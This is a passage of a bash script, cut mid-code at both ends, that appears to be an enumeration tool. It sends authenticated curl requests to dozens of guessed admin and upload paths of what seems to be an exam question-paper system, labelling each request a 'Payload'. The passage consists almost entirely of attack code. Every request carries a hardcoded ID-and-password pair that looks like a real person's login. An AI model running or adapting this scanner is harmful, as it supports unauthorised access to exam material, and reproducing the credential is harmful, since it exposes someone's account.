${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-DatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-DatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-DatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocPanel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocPanel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocPanel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Transfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Transfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Transfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorAutomation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorAutomation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorAutomation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_HandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_HandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_HandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-HandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-HandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-HandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminHandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminHandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminHandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-TestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-TestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-TestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocAutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocAutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocAutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPSystem/]:"
